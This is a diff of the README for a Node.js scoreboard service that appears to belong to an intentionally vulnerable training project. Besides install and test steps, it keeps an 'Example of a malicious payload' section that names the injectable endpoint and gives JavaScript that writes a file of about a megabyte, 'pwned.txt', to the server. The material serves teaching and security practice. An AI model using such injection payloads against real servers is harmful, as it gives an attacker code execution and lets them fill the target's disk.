@@ -1,20 +1,26 @@
+[![codecov-badge]][codecov]
+
 # Mad Scoreboard Service
+
 ## Description
 
-This is a service that generates a list of users with a score. The score is generated randomly and the list is sorted by the score. The list is returned as a JSON object.
+This is a service that generates a list of users with a score. The score is generated randomly and the list is sorted by
+the score. The list is returned as a JSON object.
 
 ## Installation
 
 ### Consuming npm packages from GitHub's NPM registry
+
 This project uses a package from the @MAD-Goat-Project organization's GitHub Package Registry.
 
 To consume npm packages from GitHub's NPM registry follow these steps:
-- Create a personal access token with the read:packages scope.
-- Create or edit an existing ~/.npmrc file to include the following line, replacing TOKEN with your personal access token:
-  -  //npm.pkg.github.com/:_authToken=TOKEN
-- If needed, install the package using the standard yarn add command:
-  - yarn add @OWNER/PACKAGE_NAME
 
+- Create a personal access token with the read:packages scope.
+- Create or edit an existing ~/.npmrc file to include the following line, replacing TOKEN with your personal access
+  token:
+    - //npm.pkg.github.com/:_authToken=TOKEN
+- If needed, install the package using the standard yarn add command:
+    - yarn add @OWNER/PACKAGE_NAME
 
 An example of a .npmrc file that grants access to the @octokit npm organization:
 
@@ -23,6 +29,7 @@ An example of a .npmrc file that grants access to the @octokit npm organization:
 @MAD-Goat-Project:registry=https://npm.pkg.github.com
 //npm.pkg.github.com/:_authToken=AUTH_TOKEN
 ```
+
 Be careful while writing the organization name.
 
 NPM is not case-sensitive, so it doesn't matter if you write @MAD-Goat-Project or @mad-goat-project.
@@ -30,6 +37,7 @@ NPM is not case-sensitive, so it doesn't matter if you write @MAD-Goat-Project o
 But yarn is case-sensitive, so you have to write @MAD-Goat-Project.
 
 ### Installing dependencies
+
 ```bash
 $ yarn
 ```
@@ -60,7 +68,8 @@ $ yarn run test:e2e
 $ yarn run test:cov
 ```
 
- ## Example of a malicious payload
+## Example of a malicious payload
+
 GET : {{BaseURL}}:{{Port}}/users/generate/:factor
 where factor is:
 
@@ -74,4 +83,8 @@ Corresponds to this JavaScript code:
 ```bash
 var fs=require("fs"),stream=fs.createWriteStream("pwned.txt",{flags:"w"});const megabyte="1000000",outputStr="yougotpwned";for(var i=0;i<megabyte/outputStr.length;i++) {stream.write("yougotpwned");}stream.end();
 ```
+
+[codecov]: https://codecov.io/gh/MAD-Goat-Project/mad-scoreboard-service
+
+[codecov-badge]: https://codecov.io/gh/MAD-Goat-Project/mad-scoreboard-service/graph/badge.svg?token=48RIIR4CKN
 
